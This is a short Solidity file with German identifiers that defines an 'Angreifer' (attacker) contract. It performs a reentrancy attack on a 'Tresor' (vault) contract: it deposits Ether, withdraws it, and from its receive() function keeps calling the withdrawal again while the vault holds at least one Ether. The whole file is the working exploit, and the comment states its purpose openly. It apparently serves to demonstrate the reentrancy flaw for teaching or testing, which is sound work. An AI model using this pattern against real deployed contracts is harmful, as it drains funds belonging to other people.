// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Tresor} from "./Tresor.sol";

// Der Angreifer zahlt einen Ether ein, hebt ihn ab und ruft in receive()
// sofort wieder abheben() auf, solange im Tresor noch etwas liegt.
contract Angreifer {
    Tresor public tresor;

    constructor(address tresorAdresse) {
        tresor = Tresor(tresorAdresse);
    }

    function angriff() external payable {
        tresor.einzahlen{value: msg.value}();
        tresor.abheben();
    }

    receive() external payable {
        if (address(tresor).balance >= 1 ether) {
            tresor.abheben();
        }
    }
}
